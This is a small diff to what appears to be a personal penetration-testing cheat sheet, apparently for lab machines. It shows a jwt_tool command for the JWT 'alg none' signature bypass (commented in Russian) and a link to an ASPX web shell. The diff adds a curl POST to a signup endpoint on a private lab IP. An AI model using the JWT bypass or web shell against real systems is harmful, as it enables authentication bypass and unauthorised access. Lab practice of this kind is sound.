@@ -178,4 +178,7 @@ https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx
 # JWT 
 
   	python3 jwt_tool.py --exploit a eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.PjndlgESbR_7uPWq7tKFd6o7l799Y45mU5KvDcO2nPI   (вставляем none в alg)
- 
+ # Curl
+
+ 	curl -X POST http://10.10.11.161/api/v1/user/signup -d 'user=ip'
+
